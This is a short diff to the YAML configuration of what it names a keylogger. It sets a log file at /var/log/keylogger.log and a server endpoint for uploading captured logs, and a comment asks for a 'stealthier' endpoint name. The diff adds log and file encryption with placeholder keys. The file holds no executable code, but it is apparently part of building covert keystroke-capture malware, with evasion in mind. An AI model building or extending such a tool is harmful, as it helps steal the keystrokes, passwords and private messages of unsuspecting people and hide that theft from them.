@@ -2,10 +2,19 @@
 log:
   file: "/var/log/keylogger.log" # define log file path
   max_size_mb: 10
+
 server:
   url: "https://127.0.0.1:5000/log" # /log is a too expressive endpoint, define a stealthier one
   timeout_ms: 5000
+
 features:
-  enable_ssl: true # good for encryption
+  encryption:
+    log_encryption:
+      enable: true
+      enable_ssl: true # good for encryption
+      ssl_key: "your-encryption-key-here"
+    file_encryption:
+      enable: true
+      key: "your-encryption-key-here"
   debug_mode: false
   retry_attempts: 3
